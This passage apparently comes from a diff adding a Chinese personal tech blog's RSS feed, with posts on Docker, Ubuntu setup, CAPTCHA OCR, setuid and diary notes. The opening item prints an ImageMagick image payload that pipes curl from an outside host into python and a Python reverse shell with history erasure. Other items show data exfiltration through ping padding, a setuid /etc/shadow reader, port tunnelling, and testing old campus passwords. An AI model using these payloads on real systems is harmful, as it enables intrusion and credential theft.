+➜ cat psh.png push graphic-context viewbox 0 0 640 480 fill &amp;#39;url(https://1&amp;#34;||curl -sS http://23.23.23.23:8000/e.py | python&amp;#34;)&amp;#39; pop graphic-context http://23.23.23.23:8000/e.py：
+import os,socket,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;24.24.24.24&amp;#34;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.unsetenv(&amp;#34;HISTFILE&amp;#34;);os.unsetenv(&amp;#34;HISTFILESIZE&amp;#34;);os.unsetenv(&amp;#34;HISTSIZE&amp;#34;);os.unsetenv(&amp;#34;HISTORY&amp;#34;);os.unsetenv(&amp;#34;HISTSAVE&amp;#34;);os.unsetenv(&amp;#34;HISTZONE&amp;#34;);os.unsetenv(&amp;#34;HISTLOG&amp;#34;);os.unsetenv(&amp;#34;HISTCMD&amp;#34;);os.putenv(&amp;#34;HISTFILE&amp;#34;,&amp;#34;/dev/null&amp;#34;);os.putenv(&amp;#34;HISTSIZE&amp;#34;,&amp;#34;0&amp;#34;);os.putenv(&amp;#34;HISTFILESIZE&amp;#34;,&amp;#34;0&amp;#34;);pty.spawn(&amp;#34;/bin/sh&amp;#34;);s.close() 然后要在 24.24.24.24 的 2333 端口监听反弹过来的shell：nc -lp 2333
+把这个图片文件上传，然后在 23.</description>
+    </item>
+    
+    <item>
+      <title>微容器</title>
+      <link>https://wrfly.kfd.me/posts/%E5%BE%AE%E5%AE%B9%E5%99%A8/</link>
+      <pubDate>Sun, 01 May 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E5%BE%AE%E5%AE%B9%E5%99%A8/</guid>
+      <description>日常唠叨 这是一篇拖了两周的博文。
+为了给实习做铺垫，我得多了解一下Docker相关的知识，两周前策划着要写国内docker服务商的对比，现在只起了个头，截了一些图，然后就写不下去了，因为要对比区别，就要压力测试，就要大把的时间，而时间这种消耗品，自己消耗的太快了，再加上自己还拖延症，又是一个烂尾工程。。。好在这一篇容易些，因为只需要花点时间搜集资料，花点时间搭建环境，花点时间测试一下就OK了，压力测试什么的最烦人了。
+不过总的体验来说，网易的蜂巢更像是一个卖VPS的，一个月28的价格也算很良心；灵雀云的话，很有微软的作风，不过微软至少每个页面都有标题，而灵雀云连页面标题都没有，该找个靠谱的前端了，还有微信绑定报错，也没人管，不过他家的镜像市场很不错，网络服务也是很给力，不管是香港服务器还是北京上海等国内服务器，速度都很给力，毕竟有亚马逊和微软合作；然后Daocloud，可以说是最docker的一家公司了，至于怎么docker了，你得试试才知道。
+然后正文开始。
+从容器说起 容器是啥？简单地说就是一个运行应用的盒子，有点类似沙盒，但是沙盒并不集成运行环境，而是依附主机的环境运行程序，给程序一块空间，让他跑。容器呢，则是集成了运行环境的一个空间，相当于在系统中新开了一块地，里面有啥？啥也没有，你得自己往里安装。
+所以容器有有点类似虚拟机的感觉，我想着也是为什么蜂巢把docker做的这么VPS。
+既然是容器，那他肯定是存放东西的，放点啥呢？放应用。
+而这应用又得分门别类的说一说，python是应用吧，ruby是应用吧，nodejs是应用吧，php是应用吧，甚至ubuntu系统都是一个应用。
+大部分的应用都是跑在系统上的，所以他们的基础镜像都是一个系统，这样一想的话，又跟虚拟机差不多了。当然，除了资源消耗。启动速度等等这些。在这里有一篇文章，说的就是关于docker的一些知识，可以花几分钟看一下，以后吹逼的时候也好有话说：https://segmentfault.com/a/1190000002734062
+微容器 顾名思义，微容器就是比一般容器小的容器，为什么比一般容器小呢？因为系统就这么大呀。
+还记得第一个docker容器，helloworld吗，那个就可以理解为一个简单的微容器，因为他小啊，而且还能输出helloworld，好像只有几K吧。
+然而ubuntu：
+REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu latest 4a2102d9faa8 4 months ago 187.9 MB 我这是四个月以前的镜像，现在升级了，估计得更大一点。
+对于服务器来说并不算什么，带宽都这么高了，分分钟就拖完了。但是对于个人来说，网速没那么快，安装升级东西很慢，测试的时候时常需要增增减减，如果要push到dockerhub上去的话，速度也是很感人的，打包的话也不是不可以啊，但是还是有点大。
+那么，就有了微容器，也可以说是一个微型的系统：
+REPOSITORY TAG IMAGE ID CREATED SIZE alpine latest 2bba2978e457 4 weeks ago 4.794 MB busybox latest 47bcc53f74dc 6 weeks ago 1.113 MB 关于busybox，维基百科上有比较详细的介绍：wikipedia - BusyBox
+还有轻量级的系统 alpine : wikipedia - 轻量级linux发行版
+简单地说，微容器就是建立在alpine等轻量级系统上的容器。
+创建一个微容器 得到一个微容器很简单，docker pull alpine就能得到了，进去之后（docker run -dti alpine ash）就是一个小型linux系统。可以用apk add来安装一些常用的软件，比如nginx，php，mysql等等。</description>
+    </item>
+    
+    <item>
+      <title>Ubuntu下更改网卡名字以及pppoe配置IPv6</title>
+      <link>https://wrfly.kfd.me/posts/ubuntu%E4%B8%8B%E6%9B%B4%E6%94%B9%E7%BD%91%E5%8D%A1%E5%90%8D%E5%AD%97%E4%BB%A5%E5%8F%8Apppoe%E9%85%8D%E7%BD%AEipv6/</link>
+      <pubDate>Wed, 27 Apr 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/ubuntu%E4%B8%8B%E6%9B%B4%E6%94%B9%E7%BD%91%E5%8D%A1%E5%90%8D%E5%AD%97%E4%BB%A5%E5%8F%8Apppoe%E9%85%8D%E7%BD%AEipv6/</guid>
+      <description>今天晚上莫名其妙解决了两个问题。
+第一个是更改Ubuntu升级到15.04之后网卡名字改变的问题，从15.04开始到16.04，网卡一直都是奇奇怪怪的名字，比如原来的eth0变成了enp1s0,wlan0变成了wpxxx(我真记不清了～)
+以前的时候找了一些方法也没有搞定，今天莫名其妙的找了一个方法，搞定了。
+配置文件事这个：/etc/udev/rules.d/10-network.rules（如果没有的话就创建一个），在里面添加如下代码：
+SUBSYSTEM==&amp;#34;net&amp;#34;, ACTION==&amp;#34;add&amp;#34;, ATTR{address}==&amp;#34;20:1a:xx:xx:xx:xx&amp;#34;, NAME=&amp;#34;eth0&amp;#34; SUBSYSTEM==&amp;#34;net&amp;#34;, ACTION==&amp;#34;add&amp;#34;, ATTR{address}==&amp;#34;70:18:xx:xx:xx:xx&amp;#34;, NAME=&amp;#34;wlan0&amp;#34; 那些xxxxxx是你网卡的MAC地址。然后重启就OK了。
+第二个是pppoe拨号的IPv6问题，以前的时候一直没搞定，今天突然发现一个文件：/etc/sysctl.d/10-ipv6-privacy.conf，是配置IPv6选择临时地址还是广播地址的，然后把里面的东西都注释掉，完美解决。
+里面的内容是这样子的：
+# IPv6 Privacy Extensions (RFC 4941) # --- # IPv6 typically uses a device&amp;#39;s MAC address when choosing an IPv6 address # to use in autoconfiguration. Privacy extensions allow using a randomly # generated IPv6 address, which increases privacy. # # Acceptable values: # 0 - don’t use privacy extensions. # 1 - generate privacy addresses # 2 - prefer privacy addresses and use them over the normal addresses.</description>
+    </item>
+    
+    <item>
+      <title>cookies-session-and-验证码</title>
+      <link>https://wrfly.kfd.me/posts/cookies-session-and-%E9%AA%8C%E8%AF%81%E7%A0%81/</link>
+      <pubDate>Wed, 13 Apr 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/cookies-session-and-%E9%AA%8C%E8%AF%81%E7%A0%81/</guid>
+      <description>概览 先来给出几个定义，什么是cookie，session 和验证码。
+Cookie:  Cookie（复数形态Cookies），中文名称为“小型文本文件”或“小甜饼”，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。
+ Session(php):  一个访问者访问你的 web 网站将被分配一个唯一的 id, 就是所谓的会话 id. 这个 id 可以存储在用户端的一个 cookie 中，也可以通过 URL 进行传递.
+ 验证码：  全自动区分计算机和人类的公开图灵测试（英语：Completely Automated Public Turing test to tell Computers and Humans Apart，简称CAPTCHA），俗称验证码，是一种区分用户是计算机或人的公共全自动程序。在CAPTCHA测试中，作为服务器的计算机会自动生成一个问题由用户来解答。这个问题可以由计算机生成并评判，但是必须只有人类才能解答。由于计算机无法解答CAPTCHA的问题，所以回答出问题的用户就可以被认为是人类。
+ 简单地说, cookie和session是用来识别用户身份的数据, cookie又可以分为保存在内存中的和保存在硬盘中的cookie, 保存在内存中的cookie在标签页关闭的时候会自动销毁, 而如果设定了cookie的过期时间, 那么cookie则会保存在硬盘中一段时间. 而且在同一浏览器中, cookie是可以共享的.
+cookie的格式:
+Set-Cookie:键1=值1;键2=值2;过期时间;作用域;作用路径;[secure]
+作用域和作用路径是用来区分cookie的, 过期时间是告诉浏览器这个cookie在什么时候过期; 而 secure 标志则是当一个请求通过 SSL 或 HTTPS 创建时，包含 secure 选项的 cookie 才能被发送至服务器.
+服务器端通过用户提供的cookie确认用户身份, 这就造成一个问题, 如果我知道你的cookie, 在cookie未过期的情况下, 那么我就可以伪造你, 而且一些敏感信息如果存放在cookie里, 就有可能通过一定的技术手段得到那些敏感信息. 因为cookie的存在是单向的. 而HTTP协议又是无状态的.</description>
+    </item>
+    
+    <item>
+      <title>数字验证码识别</title>
+      <link>https://wrfly.kfd.me/posts/%E6%95%B0%E5%AD%97%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</link>
+      <pubDate>Sun, 10 Apr 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E6%95%B0%E5%AD%97%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</guid>
+      <description>昨天整理了一下校园网的密码, 由于数据库是一年前的了, 所以有些密码不能用, 为了检验那些密码是好的, 那些是坏的, 就得去自助服务那里登陆一下才能知道. 但是登陆的时候有个问题, 验证码.
+不过学校的验证码很low, 是下面这种的:
+很容易识别, 于是就研究了一下怎样用Python识别图片中的数字.
+用到的Python库 进行图像处理需要用到两个特殊的库, 第一个是PIL包下的Image模块, 第二个是进行OCR识别的pytesseract模块.
+from PIL import Image # 图片处理, 打开, 关闭, 获取像素信息 from pytesseract import * # OCR识别的库, 对应的CLI命令行为 tesseract 二值化 我们可以看到上面的验证码颜色都比较鲜艳, 虽然看起来好看, 但是对于程序来说这是没有必要且多余的, 因为程序只需要知道某个点是黑的还是白的就好. 所以首先要做的是将图片变成黑白的.
+要将一幅鲜艳的图片转换成黑白的, 还需要一点前戏, 图片灰度. 顾名思义, 就是把那些颜色都去掉, 变成灰色. 而二值化则是将灰色的点变成黑色.
+实现二值化 灰度处理 先把上面的那张1317放大看一下:
+(手动忽略那条截图时留下的细线)
+img = Image.open(&amp;#39;1317.png&amp;#39;) # 打开图片 img = img.convert(&amp;#39;L&amp;#39;) # 转换成灰度图片 img.save(&amp;#39;1317-L.png&amp;#39;) # 保存图片 查看转换的结果:
+可以看到, 那些色彩都没了, 变成了灰色的图片.
+二值化处理 接下来就是将灰色变成黑色, 也就是二值化, 不是0就是255.</description>
+    </item>
+    
+    <item>
+      <title>20160329</title>
+      <link>https://wrfly.kfd.me/posts/20160329/</link>
+      <pubDate>Tue, 29 Mar 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/20160329/</guid>
+      <description>好久没更新博客，好像整个人都很忙的样子，实际上是碌碌无为了。
+这几个月经历了很多事情，比如又分手啊，学Python啊，出去浪啊，投简历啊，面试啊，请假不成功啊，拿offer啊，校歌赛啊，还有认识了一个有趣的姑娘啊，硬盘数据全丢啊（备份盘，检查坏道的时候多加了一个参数，日），还有喝酒啊，呕吐啊，敲代码啊，学车啊，之前还有一些补考啊，作弊啊，撸串啊，乱七八糟的。
+每个词都是一个故事。
+反正没有好好学习。
+不学习就会落后，落后就要挨打。
+以前还说过要写日记什么的，不过现在看来也就是想想了，因为没时间写日记啊。不过要是问我时间都去哪儿了，我会说，无可奉告。因为我tm也不知道我的时间都去哪儿了。感觉一天天都浑浑噩噩的，好像做了好多事情可是又好像什么事都没做。
+列了一大堆任务，可脑子里还是乱乱的，可恶的拖延症啊。
+副本太多，打不过来了。
+想想我要做什么呢？
+今晚上先把VIM的翻译搞定，真的不能再拖了。
+然后我对hack的兴趣并不是那么大了，因为要学的东西还有那么多，日站这种事情还是得放到闲暇时刻去做。
+关于看书呢，kindle里面已经有好多看不完的书了，打发时间是好的，不能指望学到太多东西。
+至于Python的学习以及每天刷题，还是不做什么计划安排了，想起来就去做一道题，反正这本书摆在桌子上，是怎么也不可能忘掉的。
+还有就是想要看完那本二百多页的自底向下的计算机的书，可时还有一本计算机网络没有看完，嗯……好麻烦。
+话说我用markdown跟不用markdown也没什么太大的区别，也就是写写字，顶多贴个代码，插个图片，还有什么呢？表格？链接？能用到的也就这么多了吧。
+然后今天的任务是先把硬盘搞定，里面的文件就懒得恢复了，恢复了也没什么用，虚拟机再配置就是了，镜像也可以再下，至于海绵宝宝和雷蒙德，唔，在线看也好。
+长远目标还有把博客改改版，毕竟这个样子还是有点low。
+还有一些东西需要了解，端口复用啊，重定向啊，管道啊，动态域名解析啊，都是些零零碎碎的了。
+还得每天检查邮件，检查服务器的运行情况。对了，我可以写个脚本让服务器把监测的信息发给我嘛，就这么定了。那什么时候写呢？等我把离线下载写完？天，我还想用Python把离线下载重写一遍。
+我还想学集群管理，不过首要任务还是先学好Docker，多做几个image，push到dockerhub上，哎对了，之前不是说要做一些hack的image嘛，还得研究研究怎样把那些镜像弄成docker，关键是那些镜像都太小了，得好好琢磨琢磨。
+又乱七八糟的了。</description>
+    </item>
+    
+    <item>
+      <title>一点笔记</title>
+      <link>https://wrfly.kfd.me/posts/%E4%B8%80%E7%82%B9%E7%AC%94%E8%AE%B0/</link>
+      <pubDate>Sun, 27 Mar 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E4%B8%80%E7%82%B9%E7%AC%94%E8%AE%B0/</guid>
+      <description>文件描述符 File descriptor （之前面试的时候亮哥有问到这个问题，因为以前了解过相关的知识，所以能扯一点，不过还是说错了一部分。）
+首先说说什么是文件描述符：
+我们知道在Linux和Unix中有这样一个概念：“一切皆文件”。那么，我们的输入输出也都可以理解为文件。而且，既然是文件的话，那么就一定有一个实体，无论是真实的实体还是抽象出来的实体。
+文件描述符就是这样一种实体，它代表了对文件操作的输入和输出的抽象实体。
+然后我们再记住几个数字：
+   数字 含义     0 标准输入（stdin）   1 标准输出（stdout）   2 标准错误（stderr）    fd0就表示标准输入，fd1则是标准输出，fd2就是标准错误输出。
+那么这些文件存放在哪儿呢？ 在linux下，可以从这里找到他们：
+/proc/process_id/fd/
+做个实验： 打开一个终端，然后查看本进程的进程号： 进程号为14684，然后去寻找它的文件描述符： (注：其实可以直接进入 /proc/self/fd/目录，两者是等价的。)
+ /proc/self This directory refers to the process accessing the /proc filesystem, and is identical to the /proc directory named by the process ID of the same process.
+ 我们试着往里面写点东西： 看到了吗？ 我们写入到1里面的话都输出到了上一个终端里面。</description>
+    </item>
+    
+    <item>
+      <title>内涵图网站</title>
+      <link>https://wrfly.kfd.me/posts/%E5%86%85%E6%B6%B5%E5%9B%BE%E7%BD%91%E7%AB%99/</link>
+      <pubDate>Thu, 04 Feb 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E5%86%85%E6%B6%B5%E5%9B%BE%E7%BD%91%E7%AB%99/</guid>
+      <description>前几天做了一个内涵图的网站：http://10pic.kfd.me
+起因是上个月QQ空间的一个应用“10张内涵图”倒闭了，但是里面的图片都很好玩，我就在倒闭的那天把图片全都爬了下来，整理了大约3650张，然后做了一个这样的网站。
+原来想着是自己撸一个PHP的相册，但是觉着这样技术难度对我来收有点高。。（自己太low了）于是就利用现成的东西，hexo的博客，搭建了这样一个图片展示网站。
+图片全都储存在我的磨，原来是想放到7牛云的，但是里面注册成标准会员还要拍身份证，还要正反面，我就没啰嗦那些事儿，果断想到了“我的磨”。
+可能你会说为什么不放到VPS上啊，我的考虑是这样的，万一那天VPS关了，里面的东西这么多，一时半会儿也倒不出来，还不如放到别人哪儿，别人给你保存的好好的，虽说网速不快，但是，能用就行啊，要啥自行车啊。
+期间遇到的问题就是整理图片比较麻烦，一是重命名，二是把这些图片的url都写到md文件中，不过想好了思路，也就几行代码的事儿，期间也温习了一下怎样搭建hexo的博客，都是很草率的做事，没有什么标准的计划和方案，我想以后学了PHP在自己写一个照片库吧：）
+前前后后大约花了5个小时，不算长。
+中间在V站分享的时候，部分人说图挂了，但是我这里是好好的，不过有位知情者指出，是移动屏蔽了我的磨的网址（wodemo.com）把它换成.net(wodemo.net)就好了。再次表示感谢。
+这一个月没干什么大事，都是些鸡零狗碎的情感问题。
+打算在寒假学Python。
+还有半个多月。</description>
+    </item>
+    
+    <item>
+      <title>Linux 101 hacks的翻译-gitbook</title>
+      <link>https://wrfly.kfd.me/posts/linux-101-hacks%E7%9A%84%E7%BF%BB%E8%AF%91-gitbook/</link>
+      <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/linux-101-hacks%E7%9A%84%E7%BF%BB%E8%AF%91-gitbook/</guid>
+      <description>啊啊啊, 转眼间就2016年了, 时间过得真快&amp;hellip;
+最近呢也没闲着, 翻译了之前那本书, 现在进度条已经滚到20%了&amp;hellip; 自己觉着翻译的还是很好的 ^_^
+放到gitbook了,链接在此:https://www.gitbook.com/book/wrfly/linux-101-hacks/details
+对bash感兴趣的去捧个场呀~
+里面废话没有我说的这么多, 书面语言总是比口头语言简练~</description>
+    </item>
+    
+    <item>
+      <title>两个软件和一个rename</title>
+      <link>https://wrfly.kfd.me/posts/%E4%B8%A4%E4%B8%AA%E8%BD%AF%E4%BB%B6%E5%92%8C%E4%B8%80%E4%B8%AArename/</link>
+      <pubDate>Sat, 12 Dec 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E4%B8%A4%E4%B8%AA%E8%BD%AF%E4%BB%B6%E5%92%8C%E4%B8%80%E4%B8%AArename/</guid>
+      <description>rename 先说rename 批量重命名的好东西，支持正则匹配，超级厉害。
+做个测试：
+for i in {1..9};do touch Hello-$i.txt;done
+然后：
+rename &amp;rsquo;s/(\w*-(\d+))/\2-\1/&amp;rsquo; *.txt
+是不是很厉害～
+lolcat &amp;amp; script 然后再说这两个好玩的软件
+lolcat在ubunut上直接 apt-get install lolcat 就能用。为了保持神秘感，不上图了，只能告诉你它很酷炫～
+然后再加一个function cat() { /bin/cat $@ | lolcat; } 这样就能让cat变成lolcat了～
+script - 很神奇的命令录制软件
+他不是屏幕录制，而是录制你的输入，通过生成的time文件和txt文件重放出来（scriptrepaly）
+录制： script -t 2&amp;gt; script.time record.txt
+重放： scriptreplay script.time record.txt
+程序员是改变世界的人！</description>
+    </item>
+    
+    <item>
+      <title>Docker笔记</title>
+      <link>https://wrfly.kfd.me/posts/docker%E7%AC%94%E8%AE%B0/</link>
+      <pubDate>Thu, 10 Dec 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/docker%E7%AC%94%E8%AE%B0/</guid>
+      <description>From: https://www.gitbook.com/book/yeasy/docker_practice/details
+BASIC Just some commands&amp;hellip;
+sudo chmod +s /usr/bin/docker (give docker an &amp;rsquo;s&amp;rsquo;)
+docker pull ubuntu (like git..)
+docker run -idt &amp;ndash;hostname test &amp;ndash;name test ubuntu (a background ubuntu bash, use docker-enter to enter it or nsenter its pid)
+docker rm (rm containers)
+docker rm $(docker ps -a -q)
+docker rmi (rm images)
+From: https://raw.githubusercontent.com/yeasy/docker_practice/master/_local/.bashrc_docker
+docker-enter container
+docker run -d -p 5000:5000 registry
+docker run -idt &amp;ndash;hostname test -v /opt/docker-share:/root/share ubuntu (When rm use docker rm -v xxx)</description>
+    </item>
+    
+    <item>
+      <title>linux-lcx</title>
+      <link>https://wrfly.kfd.me/posts/linux-lcx/</link>
+      <pubDate>Tue, 08 Dec 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/linux-lcx/</guid>
+      <description>先po代码：
+https://gist.github.com/wrfly/a55b11926e230e05a9a6
+然后说用法：
+➤ ./lcx Usage:./lcx -m method [host1] port1 [host2] port2 [-v] [-log filename] -v: version -m1: PORT1 HOST2 PORT2 -m2: PORT1 PORT2 -m3: HOST1 PORT1 HOST2 PORT2 -log: log the data For methods: -m1: listen on PORT1 and connect to HOST2:PORT2 -m2: listen on PORT1 and PORT2 -m3: connect to HOST1:PORT1 and HOST2:PORT2 粗略的解释下，希望对别人有帮助。
+mode 1: 把本机的 port1 跟 host2 的 port2 连接起来(bind to connect)
+➤ ./lcx -m1 8080 kfd.</description>
+    </item>
+    
+    <item>
+      <title>几个hack小技巧</title>
+      <link>https://wrfly.kfd.me/posts/%E5%87%A0%E4%B8%AAhack%E5%B0%8F%E6%8A%80%E5%B7%A7/</link>
+      <pubDate>Sat, 05 Dec 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E5%87%A0%E4%B8%AAhack%E5%B0%8F%E6%8A%80%E5%B7%A7/</guid>
+      <description>ping  -p pattern You may specify up to 16 ``pad&amp;rdquo; bytes to fill out the packet you send. This is useful for diagnosing data-dependent problems in a network. For example, -p ff will cause the sent packet to be filled with all ones.
+ 如果渗透到了一台机子却只能往外发ping怎么办？ -p 就可以搞定了。
+举个例子
+ping -c 1 -p `echo -n hello | xxd -ps` anoth_server 然后在another_server上面通过tcpdump就可以接收到hello。
+$ tcpdump -i vboxnet0 -A tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on vboxnet0, link-type EN10MB (Ethernet), capture size 262144 bytes IP 192.</description>
+    </item>
+    
+    <item>
+      <title>20151125</title>
+      <link>https://wrfly.kfd.me/posts/20151125/</link>
+      <pubDate>Wed, 25 Nov 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/20151125/</guid>
+      <description>乱七八糟的过完了这两个月。
+时间都在忙活一个项目，只是不能告诉你这个项目是什么。
+三千多个注册用户，八百多个使用用户，三百多个常用用户，以及三十多个在线用户。
+不懂php，不懂python，唯一会的就是配服务器，然而还曾经被打死过。20M/s就挂了，弱爆了。
+先是某个中午脑子里蹦出这个念头，再是域名注册，然后用Github的福利答了几台服务器，然后购买别家的服务器，然后更新服务端程序，然后更新博客，又添加了一些功能和在线支付，哦对，之前还开过淘宝店。上个周末又更新了主页，变成了高大上的风格。
+嗯，还是不景气。
+嗯，不知道现在该干啥了。
+嗯，不会推广。
+嗯，自己一个人。
+中间夹杂了好多事儿，比如分手啊，比如复合啊，比如又分手啊。还参加了一次CTF决赛，拿了一千块的路费之后双十一挥霍买了Kindle然而也没看过几次……
+时间过得好快。昨天刚买了回家的火车票。
+折腾是为了啥呢？为了折腾。
+那天晚上空虚的不行，想着，要不给移动硬盘装个系统吧，然后就动身了，到底也没装好，但是整个人立马就精神了许多。多动症。
+那天晚上去了一次选修课，那老师说电脑内存至少要8G，最好是32G，要不玩不了。电脑音乐制作。吓得我决定下学期再选一门别的。
+哦对了，昨天把我的个人信息卖给了趣分期，卖了20块，真后悔了，还不如去群里守着等红包呢。然后顺手测试了一波趣分期，发现了一个测试站，估计是蜜罐，对，绝对是，PHPdebug bar还在下面开着，哪有程序员这么二逼，各种路径，还有数据库的名字。apitest.qufenqi.com 不知道下次来看的时候这个站还有没有。
+这个项目算是我最成功的一个了，啪，一共就三个。
+还是败在了推广上面，当然，我自己也没激情了，其实还是不知道下一步要做什么了。也只好慢慢等，慢慢来。
+那么问题来了，我都干了些啥呢？
+书都是看了一半，过几天就要去还了。还有借的别人的Python的书，妈蛋我连看都没看啊，可耻！
+这两个月茶也没怎么喝，幸亏保质期长，茶壶也不会生锈。
+百无聊赖。
+就这样吧。</description>
+    </item>
+    
+    <item>
+      <title>文件的s标志位</title>
+      <link>https://wrfly.kfd.me/posts/%E6%96%87%E4%BB%B6%E7%9A%84s%E6%A0%87%E5%BF%97%E4%BD%8D/</link>
+      <pubDate>Tue, 10 Nov 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E6%96%87%E4%BB%B6%E7%9A%84s%E6%A0%87%E5%BF%97%E4%BD%8D/</guid>
+      <description>文件的S标志位 文件的 rwx 标志位，分别是 read，write，execute，用数字表示是 4,2,1.
+那么文件的s标志位呢？
+s标志位是 SET UID属性，指的是，这个文件在运行的时候会拥有文件所有者的权限，只要牵扯到权限这个词，那就好玩了。
+S标志位的前提：文件必须是二进制可执行文件。
+各种脚本是不行的，因为脚本中调用了其他的一些二进制程序，然而这些二进制程序并不具备S标志位，所以脚本的S标志位无效。
+鸟哥的书上是用了 passwd 这个程序来说的，passwd的owner是root，而且passwd也具备s标志位，所以当你在运行passwd这个程序的时候就会拥有root的权限，这个root权限只是在当你运行passwd程序时所拥有的，不过，如果你要是能溢出passwd的话，你就可以提权了 ：）
+做一个小测试： 普通用户是无法读取 /etc/shadow 这个文件的内容的，因为这个文件的权限是640，所有者是root，用户组是shadow，只有shadow用户组的人或者root用户才能够读取里面的内容。那么我们就来写个小程序毒一下里面的内容：
+#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main(){ FILE *file; char ch; if( (file = fopen(&amp;#34;/etc/shadow&amp;#34;,&amp;#34;r&amp;#34;)) == NULL ){ printf(&amp;#34;Permission denied!\n&amp;#34;); exit(1); } ch = fgetc(file); while(ch != EOF){ putchar(ch); ch = fgetc(file); } fclose(file); getch() } gcc catshadwo.c -o catshadow
+编译之后运行一下，如果不是root用户或者shadow用户组的人运行这个程序，就会提示不允许这样做。
+那么我们把这个文件给root，然后再给他s标志位：
+sudo chown root catshadow &amp;amp;&amp;amp; sudo chmod +s catshadow
+OK，再来运行一下就可以读取shadow里面的内容了。</description>
+    </item>
+    
+    <item>
+      <title>接着上一篇</title>
+      <link>https://wrfly.kfd.me/posts/%E6%8E%A5%E7%9D%80%E4%B8%8A%E4%B8%80%E7%AF%87/</link>
+      <pubDate>Tue, 27 Oct 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E6%8E%A5%E7%9D%80%E4%B8%8A%E4%B8%80%E7%AF%87/</guid>
+      <description>安装软件：  Kali套装 tree mtr nautilus-open-in-terminal indicator-multiload RedNoteBook stardict (and its icon, dictionary) Sublimetext Sougoupinyin UberWriter FocusWriter Chrome Firefox (Notice: Firefox won&amp;rsquo;t backup your bookmarks or so, it just sync your configs form one to another) Unity Tweak Tool Java Clementine # Music Virtual box VMware Thunder bird ( with all email accounts ) uGet htop most pv git python-pip curl tomate indicator-stickynotes  更改SWAP分区 添加或删除 默认有8G的swap分区，太大了，用不着，用 system-config-lvm 图形化管理器把lv减小，这软件很棒，不用敲命令，可视化的。 先把swap关闭 swapoff -a 然后重启，进入LiveCD模式。 把默认的swap分区删除，然后扩大主分区，再新建一个你想要的swap大小的lv，重启。</description>
+    </item>
+    
+    <item>
+      <title>Yep,installed my Ubnutu again</title>
+      <link>https://wrfly.kfd.me/posts/yepinstalled-my-ubnutu-again/</link>
+      <pubDate>Sun, 25 Oct 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/yepinstalled-my-ubnutu-again/</guid>
+      <description>At first I have to say what I&amp;rsquo;m writing blow is all bull shit.
+For these days I reinstall my Ubuntu, this is a sad story&amp;hellip;
+The reason is that I made a mistake when I repartitioned the disk. At first I want to resize the EFI partition and the boot partition because the original EFI partition is too big for me(500M) and the boot partition is a little small(just 200M), you know it&amp;rsquo;s unreasonable, so I decided to resize it.</description>
+    </item>
+    
+    <item>
+      <title>20151007</title>
+      <link>https://wrfly.kfd.me/posts/20151007/</link>
+      <pubDate>Wed, 07 Oct 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/20151007/</guid>
+      <description>一个月过去了，项目进展的也差不多。
+一个多月以来，一个不会Python，不会PHP的人硬是改了PHP的网站和Python的程序，前几天还加了一个Bash的离线下载功能，真的，收获颇丰。
+也没具体统计一共敲了多少命令，但我想，一万行总该是有的吧，毕竟6-7台服务器呢，还有那么多大大小小的功能，么么哒，亲自己一个～
+做项目期间遇到了很多人，友善的，不友善的，可爱的，不可爱的，形形色色，乱七八糟。人跟人真的不一样，讲真。国人就喜欢免费，简单，一键安装，甚至都不想动脑子，乌合之众。这也就是那么多一键安装包的崛起，你甚至都不知道它在干什么，毕竟一键安装，而你也点了同意。好在我用Ubuntu。
+我不知道我的项目能够活多久，但我希望他能够活很久。至少把前几天送礼物的钱给赚出来吧。累死累活一个多月，不求走上人生巅峰，23333.前些日子还打印了一千张广告，真，1000张。这种人生体验，没几个人能有的吧。爽！
+忽然发现自己写的乱七八糟的，是不是因为我这几个月没有练字的缘故？
+国庆七天又重新温习了一下哈利波特，从一个孩子变成了父亲。人世间那还能有比爱更强大的力量呢？可，什么又是爱呢？汤姆不知道，我也不知道。也没有比生死离别更能打动人的事了，可，生死离别之后还剩下什么呢？我才不相信什么活在我心中这样的鬼话。
+乱七八糟的，又是乱七八糟的，根本写不出东西。也许脑子里根本就没有东西。
+课也不想上，去tm的点名。明天继续翻译VIM tutorial好了，还有Linux 101 hacks。
+随便写点东西证明我的存在，我活的很好，只是每天不知道吃啥。</description>
+    </item>
+    
+    <item>
+      <title>linux-101-hacks</title>
+      <link>https://wrfly.kfd.me/posts/linux-101-hacks/</link>
+      <pubDate>Thu, 24 Sep 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/linux-101-hacks/</guid>
+      <description>Linux 101 hacks 翻译  ”There are only 10 types of people in the world — those who understand binary, those who don’t, and those who understand gray code” — Geek
+ Author:Ramesh Natarajan 译者：wrfly From:www.thegeekstuff.com
